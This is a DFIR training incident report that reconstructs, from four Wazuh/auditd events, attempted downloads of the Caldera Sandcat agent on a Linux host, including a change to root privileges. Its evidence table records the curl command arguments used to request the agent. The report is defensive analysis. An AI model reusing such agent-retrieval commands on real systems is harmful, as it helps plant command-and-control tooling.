# Incident Report 02 — Sandcat delivery attempt on Linux

**SOC / DFIR · Wazuh / auditd · Training case · Events: 08 September 2026 · Report: 21 September 2026**

> Based on the original 11-page Linux report and four Wazuh event screenshots. The original report calls this a preliminary investigation. A delivery attempt is **not** proof that the binary executed or established C2.

## 1. Scope

| Field | Value in source report |
|---|---|
| Host | LINUX-CLIENT, 192.168.100.6, Wazuh agent 007 |
| Index | `wazuh-alerts-4.x-2026.09.08` |
| Telemetry | Wazuh events containing auditd EXECVE fields |
| Observation window | 19:56:22–20:01:00 (UI; UTC+5 assumed, not independently verified) |
| Identity | auid 1000 throughout; euid 1000 initially, then euid 0 |
| C2 address | Not visible in the supplied Linux screenshots; same server as Windows was only a hypothesis |

## 2. Original event evidence

| UI time | Alert ID | euid/egid | Observed arguments |
|---|---|---|---|
| 19:56:22.541 | `b0KFgaABDIqkImm0LHNn` | 1000/1000 | `curl -s -X POST -H file:sandcat.go -H platform:linux` |
| 19:57:14.489 | `ukKGgaABDIqkImm0SHix` | 1000/1000 | `curl -svkOJ -X POST -H file:sandcat.go -H platform:linux` |
| 19:59:42.640 | `eUKIgaABDIqkImm0P4PU` | 0/0 | `curl -s -X POST -H file:sandcat.go -H platform:linux` |
| 20:01:00.029 | `YUKJgaABDIqkImm0t4pE` | 0/0 | `curl -s -X POST -H file:sandcat.go -H platform:linux` |

Other visible fields: `/usr/bin/curl`, cwd `/home/administrator`, auid 1000, exit code 0. The report explicitly notes that the later EXECVE arguments (including the destination URL), tty, session and process fields were cut off in the screenshots.

## 3. Investigation sequence

1. Filtered the Linux host's Wazuh alerts and reviewed four auditd process execution events.
2. Compared timestamps and `curl` flags. The second request adds verbose/output options.
3. Correlated `auid` and `euid`: the login identity stayed 1000 while the effective identity became root for the last two events.
4. Compared the Linux evidence with the previous day's Windows Sandcat investigation; a common operation was assessed as plausible, **not proven**.
5. Listed follow-up evidence needed: destination URL, HTTP response, downloaded file, chmod/EXECVE of any binary, and outbound connection logs.

## 4. Evidence interpretation

| Observed | Interpretation / limit |
|---|---|
| POST headers `file:sandcat.go` and `platform:linux` | Strong indicator of attempted Caldera Sandcat retrieval |
| euid transition 1000 → 0, auid unchanged | Consistent with privilege-context change; sudo was a medium-confidence hypothesis |
| `curl` exit code 0 | Does not establish a successful HTTP download |
| No screenshot of binary execution or network session | No confirmation that Sandcat ran or connected to C2 |

**ATT&CK mappings in the original report:** T1105 (Ingress Tool Transfer), T1071.001 (Web Protocols, lower confidence without URL), T1059.004 (Unix Shell), T1548.003 (Sudo and Sudo Caching, hypothesis).

## 5. Assessment

The evidence supports **four attempted retrieval commands**, including two with effective root privileges. It does not establish a successful file transfer, launch, persistence or operational C2 session. This distinction is the central analyst conclusion.

**RU:** По четырём событиям Wazuh/auditd восстановлены попытки доставки Sandcat и смена контекста euid. Получение файла, запуск агента и C2-соединение по предоставленным скриншотам не доказаны.

The original report contains the full event tables, limitations, ATT&CK mapping, recommendations, closure criteria and screenshot appendix. See the separate publication evidence package for the source document and images.
